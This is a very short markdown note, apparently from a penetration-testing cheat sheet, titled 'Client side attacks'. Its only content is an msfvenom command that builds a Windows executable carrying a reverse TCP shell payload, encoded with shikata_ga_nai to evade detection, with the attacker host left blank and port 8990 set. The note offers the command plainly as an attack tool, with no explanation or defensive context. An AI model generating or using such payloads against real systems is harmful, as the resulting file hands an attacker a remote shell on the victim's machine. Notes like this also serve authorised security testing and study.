# Client side attacks

```
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST= LPORT=8990 -e x86/shikata_ga_nai -f exe -o out.exe
```
